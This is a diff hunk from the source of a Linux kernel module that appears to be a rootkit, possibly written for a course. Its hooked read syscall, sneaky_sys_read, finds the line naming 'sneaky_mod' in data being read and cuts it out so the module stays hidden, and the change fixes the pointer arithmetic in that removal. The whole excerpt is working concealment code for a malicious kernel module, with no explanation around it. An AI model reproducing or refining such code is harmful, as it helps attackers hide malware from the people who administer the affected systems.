@@ -137,12 +137,12 @@ asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
   find_sneaky = strnstr(original_buffer, "sneaky_mod", strlen("sneaky_mod"));
   if (find_sneaky) {
     // then find the \n after it 
-    find_end = strnstr(find_sneaky, "\n", nread - find_sneaky + (char *)original_buffer);
+    find_end = strnstr((void *)find_sneaky, "\n", nread - ((void *)find_sneaky - (void *)original_buffer));
     // delete the sneaky process
     if (find_end) {
       // calculate the next after sneakly len with \n
       sneaky_len = find_end - find_sneaky + 1;
-      memmove(find_sneaky, find_end + 1, nread - find_sneaky + (char *)original_buffer - sneaky_len);
+      memmove((void *)find_sneaky, find_end + 1, nread - ((void *)find_sneaky - (void *)original_buffer) - sneaky_len);
       // edit the total length
       nread -= sneaky_len;
     }
